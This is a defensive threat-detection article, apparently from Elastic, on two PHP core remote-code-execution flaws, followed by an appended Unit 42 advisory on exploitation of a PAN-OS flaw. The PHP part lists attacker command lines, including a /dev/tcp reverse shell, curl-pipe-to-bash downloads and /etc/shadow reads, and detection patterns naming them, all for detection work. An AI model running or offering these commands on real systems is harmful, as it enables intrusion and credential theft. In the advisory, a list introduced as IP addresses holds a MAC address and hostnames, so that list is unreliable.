We have walked a PHP-adjacent RCE end-to-end before, in Detecting wp2shell: WordPress pre-authentication RCE in the wild, which turned out to use the same precedence and was caught through similar pre-built behavioral rules.

What we know about CVE-2026-109618 and CVE-2026-109619

Here is what is verified at the time of writing, and what is not.

What we know. Both vulnerabilities are unauthenticated remote code execution flaws in PHP core, each rated critical by the PHP security team with a CVSS v4.0 score of 9.2. They were reported by Wiz Research, which identified them with the help of frontier AI models and coordinated disclosure with the PHP project. Additionally, a web page called php2shell was created and contains a lot of relevant information about the vulnerability. Information leaked on October 20 ahead of the embargo, which is why PHP moved its release forward to October 21 at 14:00 UTC. With that release, PHP published the patched versions, the affected branches, and the technical root cause.The PHP security team patched the vulnerabilities through commit 31c0ea7d7ff1d1fccb6492e52dab544011628065.

What we do not know. The advisory names two distinct root-cause classes, both reachable by an unauthenticated web request:

CVE-2026-109618, RCE via out-of-memory (OOM) corruption (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized, and request cleanup may then treat the invalid data as valid.

CVE-2026-109619, RCE via stale global state (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed, and a later request handled by the same worker may use that stale state before normal initialization resets it.

Fixed versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. The risk spans any PHP installation serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP, and LiteSpeed, with the PHP team flagging mod_php as highest risk because an unauthenticated request can trigger the issue before any application code runs. PHP 8.1 and older no longer receive updates from the PHP project, though minimal source backports were provided for 7.4, 8.0, and 8.1, and some distributions and LTS vendors ship backported fixes.

Based on public reporting, the activity maps to Exploit Public-Facing Application (T1190), and once an attacker has code execution, to Command and Scripting Interpreter (T1059) and Server Software Component: Web Shell (T1505.003).

Is there a php.ini mitigation for php2shell?

The PHP security team is explicit that there are no complete mitigations and that updating is the only safe choice. It does, however, document configuration measures that reduce exposure to specific attack paths without making an installation safe. For the OOM-corruption path (CVE-2026-109618), set memory_limit=-1 in a way applications cannot override (for example php_admin_value in the FPM pool or Apache configuration), keep post_max_size low, and enforce a container or cgroup limit rather than RLIMIT_AS or RLIMIT_DATA. For the stale-global-state path (CVE-2026-109619), set session.upload_progress.enabled=0 and restart every worker, which blocks the confirmed session paths but not all variants, and on PHP 8.5 set fatal_error_backtraces=0. Apply these through php.ini, an FPM pool, or server configuration that takes effect before request parsing; ini_set() and .user.ini do not help. Treat all of these as temporary exposure reduction, not a fix, and be skeptical of social-media guidance that presents a single config toggle as a complete solution.

Why php2shell exploitation likely looks like every other PHP RCE

We now know the bug class: two memory-safety bugs in PHP core, but the detection opportunity is in the outcome, not the trigger.

A remote attacker exploiting a PHP web application wants code execution in the context of the web stack, and that context is a predictable set of processes: php-fpm and its workers, php-cgi, lsphp, or a general web server like apache2, httpd, or nginx driving PHP. Once the attacker has execution inside that context, the next actions are almost always the same regardless of how they got there:

Confirm access. A first command through a shell to prove execution and establish identity: id, whoami, uname -a, hostname, or cat /etc/os-release.

Enumerate for escalation. Quick checks for a path to root: sudo -l, find / -perm -u=s -type f for SUID binaries, getcap -r / for capabilities, or reading /etc/passwd and /etc/shadow.

Stage through an interpreter. Pivot out of the shell into a richer runtime: python3 -c, perl -e, ruby -e, node -e, or back into PHP itself with php -r, often to run code that never touches disk.

Pull second-stage tooling. Retrieve a payload with curl -O or wget -O, or pipe it straight into an interpreter (curl http(s)://... | bash, wget -qO- http(s)://... | sh).

Decode a staged payload inline. Unpack an embedded blob without a download: echo <b64> | base64 -d | sh, openssl enc -d, or xxd -r.

Open a reverse shell. The usual primitives: bash -i >& /dev/tcp/<ip>/<port> 0>&1, mkfifo paired with nc, socat, a Python pty.spawn, or PHP fsockopen.

Harvest credentials and cloud identity. Read .env files, ~/.aws/credentials, a mounted service account token under (var)/run/secrets/kubernetes.io/, or the instance metadata endpoint at 169.254.169.254.

Drop a webshell. Write attacker-controlled PHP into the web root (.php, .phtml), sometimes disguised as an image polyglot or a double extension such as avatar.php.jpg to slip past upload validation.

Establish persistence beyond the shell. Add a cron entry, a systemd unit, or an SSH key to ~/.ssh/authorized_keys so access survives a webshell cleanup.

This is exactly the host footprint we walked end-to-end in the wp2shell post. There, a completely different bug (a WordPress REST batch route confusion) ended in apache2 spawning dash to run sh -c -- id; whoami; hostname, and plugin files landing under wp-content/. The entry point was WordPress-specific. The thing that fired the detections was not. A web server process spawning a shell or writing a payload is abnormal no matter which vulnerability opened the door, which is why we build detection on that behavior rather than on an exploit string that doesn’t exist yet. Although we can generally predict the outcome, we can never be entirely certain that we fully cover the threat, as there could be other forms of post-exploitation that we don't catch, like creation of an account or fileless PHP script execution.

That is the core of predicting coverage before a PoC lands: detect the convergent flow, not the specific trigger.

The php2shell post-exploitation flow: what a compromised web server does next

This section is the durable, exploit-agnostic layer. It keys on a web server process (PHP runtimes and general web servers) taking an action that is abnormal for a request-serving daemon. We group the coverage by the observable outcome. Endpoint (EDR) rules are shipped in the public protections-artifacts repository and can prevent as well as alert; SIEM rules are shipped in the public detection-rules repository. The queries below show only the distinctive predicate, not the full rule with all of its production exclusions.

Process execution: the web server spawns a shell

The tightest signal for "a PHP RCE just succeeded" is a request-serving process spawning a shell to run a suspicious command. The endpoint rule keys on a non-interactive web server parent launching a shell with a high-risk command line, and terminates it where prevention is enabled:

process where event.type == "start" and event.action == "exec" and process.parent.interactive == false and ( process.parent.name in ("apache2", "httpd", "nginx", "php-cgi") or process.parent.name like ("php-fpm*", "lsphp*") ) and process.name in ("bash", "dash", "sh", "zsh", "ksh") and process.args in ("-c", "-cl", "-lc") and ( process.command_line like~ ( "*/dev/tcp*", "*|*base64 -d*", "*curl*", "*wget*", "*/etc/shadow*" ) or process.args in ("id", "whoami", "hostname") )

This maps to the endpoint rule Payload Execution by Web Server, which covers a broad set of web server parents (the PHP runtimes, Apache, nginx, and many application servers) and a long catalog of suspicious command lines, from discovery commands through reverse shells, decoding pipelines, and credential-file access. It is the rule that terminated dash in the wp2shell run.

On the SIEM side, two rules cover the same shell activity without a preventive action, which lets them carry fewer exclusions and reduce the risk of false negatives. Suspicious Command Execution via Web Server matches known-bad command lines from a web server parent. Unusual Command Execution via Web Server is a new_terms rule: it learns which shell command lines each web server parent normally runs on a host, then alerts on lines that break the baseline. A fresh exploit introduces command lines the host has never seen, so the two stack well together.

Child execution: the web server spawns a non-shell child

Not every PHP RCE goes through a shell. A php2shell payload may invoke an interpreter directly (python -c, perl -e), pull tooling with a downloader, or drop into a reverse-shell helper. Two SIEM rules cover a web server spawning children outside its normal set:

We have an endpoint rule named Suspicious Web Server Child Process, which covers a broad set of web parents and potentially suspicious child processes. This rule has response actions to kill the child process.

For SIEM, we have a similar but broader rule named Suspicious Child Execution via Web Server, which keys on a web server parent whose child is run from a suspicious path (/tmp/, /dev/shm/, /var/tmp/, the web root) or is a suspicious binary (an interpreter, a networking utility, a cloud CLI, a file with a script extension). Unusual Child Execution via Web Server applies the new_terms approach to child executions, surfacing child processes a given web server has never spawned on that host. They did not fire in the wp2shell run, because that chain went through dash and standard discovery binaries that the command-execution rules already cover, but they are the layer that catches a variant invoking curl | bash or python -c directly.

Payload download: the web server pulls second-stage tooling

A common follow-on to PHP RCE is retrieving a second-stage payload. The endpoint rule Payload Downloaded via Curl or Wget by Web Server detects a web server parent invoking curl or wget through a shell to save a remote file to disk or pipe it into an interpreter, and terminates it where prevention is enabled. It did not need to fire in the wp2shell PoC, which carried its own payload, but it is a high-value layer for a real intrusion that stages tooling from an external host.

File creation: the PHP webshell drop

Before any command runs, the attacker often has to write a file: a webshell, a dropped script, an uploaded archive. A web server writing new executable or script content into the web root is abnormal outside of a deployment. Three rules cover this from different angles:

Unusual File Creation via Web Server is a new_terms rule that flags a web server creating or renaming a file it does not normally touch.

Unusual File Creation by Web Server is a building block rule that surfaces unusual file creations by a web server parent, useful as correlation context rather than a standalone alert.

File with High Entropy Created by Web Server keys on a web server writing a high-entropy file with a web-executable extension, a common sign of an encoded or encrypted payload such as an obfuscated .phtml webshell.

How to prepare coverage for php2shell before the exploit exists

Because the post-exploitation flow is predictable, you can line up coverage now rather than scrambling when the exploit code appears. Enable these pre-built SIEM rules on any host running PHP or a web server:

Suspicious Command Execution via Web Server

Unusual Command Execution via Web Server

Suspicious Child Execution via Web Server

Unusual Child Execution via Web Server

Unusual File Creation via Web Server

Unusual File Creation by Web Server

File with High Entropy Created by Web Server

Web Shell Detection: Script Process Child of Common Web Processes

Deploy Elastic Defend with prevention enabled on those same hosts to add the endpoint layer, which can terminate processes that match the applicable behavioral rules. The high-entropy rule require Elastic Stack 9.3.0 or later. In the Elastic Defend integration policy, under advanced settings, set linux.advanced.events.populate_file_data to true and verify that incoming file events include file.Ext.entropy for the high-entropy rule.

The coverage spans two data sources, process and file, which is why both layers matter:

How to find PHP installs that may be affected by php2shell

Start by identifying PHP deployments across Linux and Windows, including runtimes bundled with other applications. Patched versions are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35, so use the queries below to inventory PHP across your environment and prioritize anything that is unpatched or end of life.

Find PHP through process telemetry

In Kibana Discover, select a data view containing process events, such as logs-endpoint.events.process-*, and search the available retention period, for example, the last 7 days:

event.category: process and ( process.name: (php* or lsphp* or frankenphp or sw-engine-fpm) or process.parent.name: (php* or lsphp* or frankenphp or sw-engine-fpm) )

Review host.name, process.executable, process.parent.executable, and container.id where available. The query includes common Windows process names such as php.exe and php-cgi.exe. Parent-process matches can also reveal PHP workers through their recorded child processes.

Locate PHP installs on Linux and Windows

Process telemetry can miss inactive installations. Use Osquery to check common system and hosting-platform locations for PHP binaries and Apache PHP modules. The first example runs the query for Linux systems:

SELECT DISTINCT path, filename, type, symlink FROM file WHERE ( path LIKE '/usr/bin/php%' OR path LIKE '/usr/sbin/php%' OR path LIKE '/usr/local/bin/php%' OR path LIKE '/usr/local/sbin/php%' OR path LIKE '/usr/lib/cgi-bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/bin/php%' OR path LIKE '/opt/cpanel/ea-php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/plesk/php/%/bin/php%' OR path LIKE '/opt/plesk/php/%/sbin/php-fpm%' OR path LIKE '/opt/remi/php%/root/usr/bin/php%' OR path LIKE '/opt/remi/php%/root/usr/sbin/php-fpm%' OR path LIKE '/opt/rh/rh-php%/root/usr/bin/php%' OR path LIKE '/opt/rh/rh-php%/root/usr/sbin/php-fpm%' OR path LIKE '/usr/local/lsws/lsphp%/bin/lsphp' OR path LIKE '/usr/local/lsws/fcgi-bin/lsphp%' OR path LIKE '/snap/php%/%/bin/php%' OR path LIKE '/nix/store/%php%/bin/php%' OR path LIKE '/usr/lib/apache2/modules/libphp%.so' OR path LIKE '/usr/lib/httpd/modules/libphp%.so' OR path LIKE '/usr/lib64/httpd/modules/libphp%.so' /* Generic custom installation paths */ OR path LIKE '/%/php%/php%' OR path LIKE '/%/php%/%/php%' OR path LIKE '/%/%/php%/php%' OR path LIKE '/%/%/php%/%/php%' OR path IN ( '/usr/bin/lsphp', '/usr/local/bin/lsphp', '/usr/bin/frankenphp', '/usr/local/bin/frankenphp' ) ) ORDER BY path;

The second query checks common Windows standalone and bundled installations.

SELECT DISTINCT path, filename, file_version, product_version FROM file WHERE ( path LIKE 'C:\PHP%\php%' OR path LIKE 'C:\PHP%\%\php%' OR path LIKE 'C:\%\PHP%\php%' OR path LIKE 'C:\%\PHP%\%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\php%' OR path LIKE 'C:\Program Files%\%\PHP%\%\php%' OR path LIKE 'C:\wamp%\bin\php\%\php%' OR path LIKE 'C:\laragon\bin\php\%\php%' OR path LIKE 'C:\Program Files%\Plesk\Additional\%PHP%\php%' OR path LIKE 'C:\Program Files%\Plesk\admin\bin\php%' ) AND LOWER(filename) IN ('php.exe', 'php-cgi.exe', 'php-win.exe') ORDER BY path;

This results in the following example hits:

We can also leverage OSQuery’s deb_package and rpm_package tables:

SELECT name, version, arch, status FROM deb_packages WHERE status = 'install ok installed' AND ( name LIKE 'php%' OR name LIKE 'libapache2-mod-php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ) ORDER BY name;

And:

SELECT name, version, release, epoch, arch FROM rpm_packages WHERE name LIKE 'php%' OR name LIKE 'lsphp%' OR name LIKE 'ea-php%' OR name LIKE 'plesk-php%' OR name = 'sw-engine' ORDER BY name;

Of course, this is a short list of potential locations; use your own inventory to scan your environment. Extend these paths for other drives, custom installations, and vendor software. Inspect container filesystems separately. File matches may include unused installations, wrappers, or helper utilities. Missing results do not establish that PHP is absent.

What to do about CVE-2026-109618 and CVE-2026-109619 right now

PHP has released the fixes, so patching is now the priority, with exposure reduction for anything you cannot patch immediately:

Inventory every PHP install you own. Start with internet-facing web servers, then go looking for the less obvious locations: vendor appliances and software that bundle a PHP runtime, control panels, and anything running WordPress, Drupal, Joomla, or Magento.

Patch internet-facing systems first, to PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35, and check your Linux distribution and hosting provider for backported packages.

Identify end-of-life PHP. If you are running PHP 8.1 or older, the PHP project no longer ships updates, though minimal source backports exist for 7.4, 8.0, and 8.1 and some vendors provide backported packages. Upgrade, take it off the internet, or place it behind a VPN or web application firewall until you can.

If you cannot patch immediately, apply PHP's documented partial mitigations (for example session.upload_progress.enabled=0, and a constrained memory_limit and post_max_size), but treat them as temporary exposure reduction, not a fix.

If you find something, isolate the host and preserve web server and PHP logs. Look for webshells and new files in the web root, along with new cron jobs, services, and accounts.

php2shell detection: what holds regardless of the root cause

CVE-2026-109618 and CVE-2026-109619 are two critical, unauthenticated PHP core RCE flaws that were publicly identified before their coordinated disclosure. The patched releases (8.5.12, 8.4.27, 8.3.36, 8.2.35) and the two root-cause classes are now public, but the post-exploitation outcome is what makes them detectable: a web server process spawning a shell, pulling a payload, or dropping a webshell into the web root. Elastic already ships the behavioral layer that catches that convergent flow across both process and file telemetry.

Patch now, isolate what you cannot patch, and verify the web-server-to-shell detection stack is enabled on your PHP hosts. We will revisit this post with concrete telemetry as reliable public exploitation details emerge.

Title: Active Exploitation of May 2026 PAN-OS CVE-2026-0257 (Updated October 20)
Context: June 5, 2026 In June 2026, Palo Alto Networks Unit 42 observed active exploitation of the May 2026 PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting...
Full Text:
Executive Summary

October 19 Update

Unit 42 has observed attempted exploitation of the May 2026 CVE-2026-0257 by ransomware operators, including Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc).

We’re also aware of public reporting attributing exploitation to threat actors using Settra ransomware.

Fixes for this vulnerability have been available since May 2026. Palo Alto Networks has become aware of limited exploit attempts on unpatched PAN-OS devices without mitigations applied.

Customers can mitigate the risk of this issue by taking any of the following actions:

Use a dedicated certificate for Authentication Override cookies: Generate a new certificate exclusively for authentication override cookies and store it securely. Do not reuse the portal or gateway certificate, and do not share this certificate with other features or users.

Disable Authentication Override: Uncheck the Authentication Override options (for generating and accepting cookies) in the GlobalProtect portal and gateway configuration.

June 5, 2026

In June 2026, Palo Alto Networks Unit 42 observed active exploitation of the May 2026 PAN-OS vulnerability CVE-2026-0257 by an unidentified threat actor attempting to access GlobalProtect. This security flaw involves an authentication bypass in the portal and gateway components of vulnerable versions of PAN-OS® software, which could allow unauthorized attackers to circumvent security controls and initiate virtual private network (VPN) connections.

This CVE was added to the Known Exploited Vulnerability (KEV) catalog on May 13, 2026.

No post-access behavior or lateral movement was identified. Only a small portion of the probed devices actually established VPN sessions, resulting in gateway-connected events.

We advise organizations to proactively hunt for the indicators of the activity specified in this report and activate incident response protocols for any successful gateway-connected events linked to these indicators. Additionally, we strongly recommend reviewing the security advisory for CVE-2026-0257, following the available workarounds and mitigations or upgrading to a version that includes a fix for this issue.

For pre-proof-of-concept release (May 29, 2026) activities, search for these IP addresses in GlobalProtect logs to look for successful login connection:

00:11:22:33:44:55

WINDOWS-LAPTOP-001

GP-CLIENT

As part of post-PoC release monitoring, search GlobalProtect logs for successful gateway-connected events matching the following hard-coded client configuration values from the PoC code.

endpoint_os_version : Microsoft Windows 10 Pro 64-bit

source_user_info.domain : empty

We encourage organizations to consult our official Palo Alto Networks Security Advisory for additional details about the vulnerability and configuration guidance. We also recommend reading Rapid7’s technical analysis about the exploitation activity they observed in the wild.

Palo Alto Networks Cortex Xpanse is able to identify publicly exposed PAN-OS gateways and GlobalProtect portals.

Management Interface Exposure Risk and Remediation

During incident response (IR) engagements associated with the Lunar Peak campaign, Unit 42 observed a recurring misconfiguration that led to critical, unintended exposure. Specifically, organizations frequently mapped GlobalProtect (GP) profiles to HTTP/HTTPS services on their management interfaces.

This configuration inadvertently exposes the management interface to the internet on specific ports, most notably 4443 and 3879, often without administrators' knowledge. While the risks of this exposure were previously documented, the frequency of this oversight during the Lunar Peak incidents prompted a comprehensive update to our official guidance to ensure maximum clarity.

Verification and mitigation:

Verify exposure: Defenders can rapidly verify whether their environments are affected by attempting an out-of-band HTTPS connection to their management IP address on ports 4443 and 3879 via an external web browser.

Remediate: To remediate this issue and enforce the principle of least privilege, we strongly advise administrators to review official Palo Alto Networks documentation on configuring Interface Management profiles to safely restrict access.

Update: Oct. 19, 2026

Ransomware operators exploiting the May 2026 CVE-2026-0257 include Spikey Scorpius (aka Qilin) and Tarnished Scorpius (aka Inc). Public reporting attributes exploitation to threat actors using Settra ransomware.

Attackers are leveraging this vulnerability to gain an initial foothold into corporate networks, subsequently bypassing multi-factor authentication (MFA) controls to establish a VPN session. Following this, the threat actors are typically:

Conducting internal network reconnaissance using dual-use remote monitoring and management (RMM) tools

Moving laterally via RDP and SMB

Staging additional tooling for credential harvesting, data exfiltration and ultimately, ransomware deployment

Our investigations have continued since early June 2026, and have spanned across numerous industries, including:

Education

Financial services

Healthcare

High technology

Hospitality

Manufacturing

Professional and legal services

Government

Transportation and logistics

Utilities and energy

Wholesale and retail

The most significant evolution in tactics, techniques and procedures (TTPs) following successful exploitation of CVE-2026-0257 is the direct pivot to the virtualization layer. In one notable case, attackers moved from the compromised VPN gateway to the vCenter management appliance. From there, they disabled security controls on ESXi hypervisors (execInstalledOnly) and used a custom tool to perform offline credential dumping directly against a domain controller's virtual disk (VMDK).

This tactic bypasses in-guest endpoint detection and response (EDR) and security controls, representing a highly sophisticated method for obtaining domain-wide credentials. We have also observed actors chaining this initial access with other exploit tools, such as those targeting Veeam backup infrastructure (CVE-2023-27532), to maximize their impact.

Conclusion

Palo Alto Networks shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the Cyber Threat Alliance.
